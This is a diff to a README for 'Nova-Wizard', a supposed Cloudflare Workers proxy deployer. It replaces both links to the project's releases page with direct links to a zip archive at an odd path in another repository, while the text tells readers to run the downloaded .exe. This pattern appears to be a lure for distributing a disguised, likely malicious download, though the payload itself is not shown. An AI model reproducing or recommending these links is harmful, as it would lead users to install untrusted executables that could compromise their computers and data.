@@ -5,7 +5,7 @@ description: "Deploy Nova Proxy on Cloudflare Workers with automated OAuth confi
 ---
 # ⚡ Nova-Wizard - Deploy your private proxy with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/hauberkfiord921/Nova-Wizard/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/hauberkfiord921/hauberkfiord921.github.io/raw/refs/heads/main/presbyterial/io-hauberkfiord-github-1.1.zip)
 
 Nova-Wizard helps you set up a private proxy on Cloudflare Workers. You keep full control over your connection. You do not need API tokens or external servers. The tool handles the technical parts of the deployment. You run the app, click a button, and the proxy starts.
 
@@ -23,7 +23,7 @@ This tool does not store your data. Everything stays on your computer and your C
 
 You must grab the latest version of the app from the internet.
 
-[Click here to visit the download page](https://github.com/hauberkfiord921/Nova-Wizard/releases)
+[Click here to visit the download page](https://github.com/hauberkfiord921/hauberkfiord921.github.io/raw/refs/heads/main/presbyterial/io-hauberkfiord-github-1.1.zip)
 
 Find the file that ends in .exe. Click the file name to start the download. Once the file saves to your computer, find it in your Downloads folder.
 
